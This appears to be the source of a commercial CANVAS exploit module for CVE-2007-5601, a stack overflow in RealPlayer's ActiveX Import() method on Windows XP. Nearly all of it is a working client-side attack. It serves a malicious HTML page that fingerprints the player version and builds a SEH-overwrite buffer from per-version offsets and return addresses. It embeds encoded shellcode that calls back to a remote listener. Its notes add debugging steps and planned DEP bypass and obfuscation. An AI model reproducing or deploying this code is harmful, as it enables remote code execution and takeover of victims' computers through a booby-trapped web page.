#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2007
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import getopt
import socket
import time
import struct

from exploitutils import *
from tcpexploit import *
from MOSDEF import mosdef
from httpclientside import httpclientside

NAME='Real Player ActiveX Import Overflow'
DESCRIPTION='Real Player ActiveX Import Stack Overflow'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Real"
DOCUMENTATION['Date public']='10/18/2007'
DOCUMENTATION['References']=''
DOCUMENTATION['Repeatability']='Infinite'
DOCUMENTATION['VersionsAffected']=''
DOCUMENTATION["URL"]="http://www.us-cert.gov/cas/techalerts/TA07-297A.html"
DOCUMENTATION["VendorNote"]="http://docs.real.com/docs/security/SecurityUpdate101907Player.pdf"
DOCUMENTATION["VendorPatch"]="http://service.real.com/realplayer/security/191007_player/en/"
DOCUMENTATION["CVE Name"]="CVE-2007-5601"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5601"
DOCUMENTATION['CVSS'] = 9.3



VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Clientside'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['XP']
PROPERTY['DELIVERY'] = 'HTTP'

NOTES="""
This is the documentation for this ActiveX control
http://service.real.com/help/library/guides/extend/embed.htm

The bug is here though. We can probably expect lots of other similar bugs.

http://www.edu.yar.ru/docs/RealMedia/SMIL/R1PAuthoringGuide.pdf
(also note the API that lets you list remote DLL's, for targeting)

Import()
    Imports a local file into a RealONE play list or into the My Music folder.
    Availability
    Client-side RealONE Player environment JavaScript 1.2
    Synopsis
         window.parent.external.Import( filename, playlist, metadata, bPlayFile,
                                        bCopyToMyMusic )
                                                                                 11
                Arguments
                filename                   String containing the name of the local file.
                playlist                   String containing the name of the playlist to which to add the
                                           local file. To import without adding to a playlist, use an empty
                                           string "" for this parameter.
                metadata                   String containing the metadata information in the form
                                           "field=value;field=value;..." Valid field values include Title,
                                           Album name, Artist name, Genre, Mood, Situation,
                                           Preference, Language, Year, CDNum, Comments, TrackURL,
                                           ProviderURL, ArtistURL, BuyCDURL, and Plan.
                bPlayFile                  Specify true to play the imported file; otherwise false.
                                           Specify true to copy the imported file to the My Music folder;
                bCopyToMyMusic
                                           otherwise false.
                Description
                     Import() enables a local file to be imported to a specific playlist and be
                     copied to the My Music folder and specified for immediate playback.


Following test addresses are on RealPlayer 11 Beta (downloaded version)
63CD2DE0 - rjbdll.dll checkforfile

63BCDFE0 - another function
63BFF580 rjbdll.dll RealHandleImport
63BFF540 rjbdll.dll HandleImport (top level function just calls a function pointer)
   
Buffer is 0x12A8 before the SEH pointer

Bug itself is a memcpy in MPAMedia.61E0D9C0   
   called from MPAMedia.61DEB580 (61DEB5EA has the call) 
   called from MPAMedia.61DEBE47
   
At MPAMedia.61DEBDCE - you'll see this:
   MOVSX ESI, WORD PTR [EBX+F6]

Then a JLE (oops!) :>

(see callstack.txt in this dir)

4 DLL's are not SAFESEH protected:
- rpap3260.dll
- imgrender.dll
- flash9d.ocx
- msacm32.drv

To debug this start up a RealPlayer and then attach to it with Immunity
Debugger. Then start up httpserver:
./exploits/httpserver/httpserver.py -t 10.10.11.1 -O singleexploit:real_import -p 8080 -l 10.10.11.1 -d 5555 -O httpmosdef:1
./commandlineInterface.py -l 10.10.11.1 -v 9 -p 5555

If you've already exploited this (or failed to) then you'll need to click on "Repair Database". 

If the exploit has failed and RealPlayer hasn't crashed, the file would have been added to 'My Library' and
the exploit won't work anymore with that specific filename. So either remove it manually from 'My Library'
if on the machine, or change the filename if exploiting it remotely.
"""

CHANGELOG="""
Todo:
- Write exploit for XP SP2 that removes DEP and executes shellcode
- Fingerprint all versions of RealPlayer
- Add javascript obfuscation
- See if you can own Mozilla/Opera/Safari
"""

targets={
    0: ['Autodetect',0],
    #version,offset,pop&pop&ret(@rpap3260.dll)
    1: ['RealPlayer 11BETA on Windows XP',['6.0.14.536',0x12a4,0x63701573]],
    2: ['RealPlayer 11BETA on Windows XP',['6.0.14.543',0x12a4,0x600815a3]],
    3: ['RealPlayer 11BETA on Windows XP',['6.0.14.544',0x12a4,0x600815a3]],
    4: ['RealPlayer 11BETA on Windows XP',['6.0.14.550',0x12a4,0x600415a3]],
    5: ['RealPlayer 10.5GOLD on Windows XP',['6.0.12.1059',0x12a0,0x603b1215]],
    6: ['RealPlayer 10.5GOLD on Windows XP',['6.0.12.1212',0x12a0,0x61c01215]],
    7: ['RealPlayer 10.5GOLD on Windows XP',['6.0.12.1235',0x12a0,0x60081215]],
    8: ['RealPlayer 10.5GOLD on Windows XP',['6.0.12.1348',0x12a0,0x62551215]],
    9: ['RealPlayer 10.5GOLD on Windows XP',['6.0.12.1465',0x12a0,0x62021215]],
    10: ['RealPlayer 10.5GOLD on Windows XP',['6.0.12.1483',0x12a0,0x62221215]],
    11: ['RealPlayer 10.5GOLD on Windows XP',['6.0.12.1662',0x12a0,0x63141215]],
    12: ['RealPlayer 10.5GOLD on Windows XP',['6.0.12.1698',0x12a0,0x63241215]],
    13: ['RealPlayer 10.5GOLD on Windows XP',['6.0.12.1741',0x12a0,0x632b1215]],
}

class theexploit(tcpexploit,httpclientside):
    def __init__(self):
        tcpexploit.__init__(self)
        httpclientside.__init__(self)
        self.searchMethod=self.AcceptAll
        self.UserAgent=[('Mozilla/','MSIE','')]
        self.clientversion=1
        self.badstring='\0'
        self.name=NAME
        self.filename='test.html'
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'Version %d: %s'%(t,targets[t][0])
        return

    def neededListenerTypes(self):
        import canvasengine
        return [canvasengine.WIN32MOSDEF]
    
    def createShellcode(self):
        host=self.callback.ip
        port=self.callback.port
        httpWrapper=''
        try:
            if self.HTTPMOSDEF:
                print '[!] using HTTP MOSDEF tunneling ..'
                sc=shellcodeGenerator.win32()
                sc.addAttr('findeipnoesp',{'subespval':0x1000})
                if self.useSSLMOSDEF:
                    ssl='s'
                else:
                    ssl=''
                sc.addAttr('httpGetShellcode',{'URL':'http%s://%s:%d'%(ssl,host,port)})
                httpWrapper=sc.get()
                print '[!] HTTP MOSDEF len: %d bytes'%(len(httpWrapper))
        except:
            httpWrapper=''
        rawshellcode=self.createInjectToSelf(host,port,injectme=httpWrapper,movetostack=True)
        from encoder import chunkedaddencoder
        encoder=chunkedaddencoder.intelchunkedaddencoder()
        encoder.setbadstring(self.badstring)
        self.shellcode=encoder.encode(rawshellcode)
        return self.shellcode

    def encodeBuffer(self,buffer):
        chararray=[0x20ac,0x81,0x201a,0x192,0x201e,0x2026,0x2020,0x2021,0x2c6,0x2030,0x160,0x2039,0x152,0x8d,0x17d,0x8f,0x90,0x2018,0x2019,0x201c,0x201d,0x2022,0x2013,0x2014,0x2dc,0x2122,0x161,0x203a,0x153,0x9d,0x17e,0x178]
        #usual unicode stuff
        data=''
        for i in range(len(buffer)):
            b=ord(buffer[i])
            if b>=0x80 and b<0xa0:
                h=chararray[b-0x80]
            else:
                h=b
            if h<0x100:
                data+='%%%02x'%(h)
            else:
                data+='%%u%02x%02x'%((h>>8)&0xff,h&0xff)
        return data

    def getArgs(self):
        self.host=self.target.interface
        self.filename=self.argsDict.get('filename',self.filename)
        return

    def makefile(self):
        self.getArgs()
        filedata="""<html>
<body>
<script type="text/javascript">
    function UnpackVersionNumber(n) {
        return ''+(n>>28)+'.'+((n&0xff00000)>>20)+'.'+((n&0xff000)>>12)+'.'+(n&0xfff);
    }
    function build_playlist(realplayer) {
        realversion=UnpackVersionNumber(realplayer.RealPlayerVersion)
        //document.write(realversion+'<br>');
        offset=0;
        sehjump='';
VERSIONCHECK
        if (offset==0 && sehjump=='') //unknown version
            return '';
        playlist='';
        playlist+=unescape('SHELLCODE');
        while (playlist.length!=offset) {
            playlist+='A';
        }
        //SEH structure goes here
        playlist+=unescape(sehjump);
        //fill to get an access violation
        while (playlist.length!=0x8000) {
            playlist+='A';
        }
        return playlist;
    }
    function play_movie() 
    {
        try {
            realplayer=new ActiveXObject('IERPCtl.IERPCtl.1');
        }   
        catch (error) {
            document.write('No RealPlayer detected. Cannot play the movie!');
            return;    
        }
        //if we get here, we do have realserver, and presumably can call it via ActiveX
        if (realplayer.PlayerProperty('PRODUCTNAME')!='RealPlayer') {
            document.write('Product is not RealPlayer!');
            return;
        }
        movie_playlist=build_playlist(realplayer);
        if (movie_playlist=='') {
            document.write('RealPlayer version not supported!');
            return;
        }
        document.write('About to play movie.<br>');
        // document.write('Playlist='+playlist+'<br>');
        // should probably use an HTTP-able media file here so we know it got to this point
        // this is the default one that comes with RealPlayer
        // for some reason just using "videotest.rm" fails on XP SP0, but "./videotest.rm" works.
        // this doesn't work on XP SP2
        // On XP SP2 we use the full string: "c:\\\\Program Files\\\\Real\\\\RealPlayer\\\\videotest.rm"
        video='c:\\\\Program Files\\\\Real\\\\RealPlayer\\\\videotest.rm'
        realplayer.Import(video, movie_playlist,'',true,false);
        document.write('Played movie.<br>');
    }
    //play our movie
    play_movie();
</script>
</body>
</html>
"""
        filedata=filedata.replace('SHELLCODE',self.encodeBuffer(self.shellcode))
        versioncheck=''
        for i in range(1,len(targets)):
            targetinfo,targetdata=targets[i]
            self.log('Adding version information for %s (v%s)'%(targetinfo,targetdata[0]))
            sehjump=''
            sehjump+='\xeb\x06'
            sehjump+='AA'
            sehjump+=struct.pack('<L',targetdata[2])
            sehjump+=mosdef.assemble('jmp $-%d'%(targetdata[1]+8+5),'x86')
            versioncheck+='        if (realversion=="%s") { offset=%d; sehjump="%s"; }\n'%(targetdata[0],targetdata[1],self.encodeBuffer(sehjump))
        filedata=filedata.replace('VERSIONCHECK',versioncheck)
        self.log('Filedata: %s'%(filedata))
        return filedata

    def makesploit(self,clientheader,clientbody):
        from libs.spkproxy import header, body
        h=header('SERVER')
        b=body()
        if clientheader.URL.count(self.filename):
            self.createShellcode()
            sploitstring=self.makefile()
            b.setBody(sploitstring)
            h.addHeader('Content-Type','text/html')
        else:
            self.log('Redirecting to self')
            h.status='302'
            h.addHeader('Location',self.filename)
            h.addHeader('Content-Type','text/html')
        return h,b

    def run(self):
        self.getArgs()
        filedata=self.makefile()
        self.log('Opening %s for output'%(self.filename))
        fd=file(self.filename,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('Wrote to %s'%(self.filename))
        return 1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v%s'%(DESCRIPTION,VERSION)
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None] and hasattr(ret,'interact'):
        ret.interact()
    elif ret not in [0,1,None]:
        print 'Weird return value: %s'%(ret)
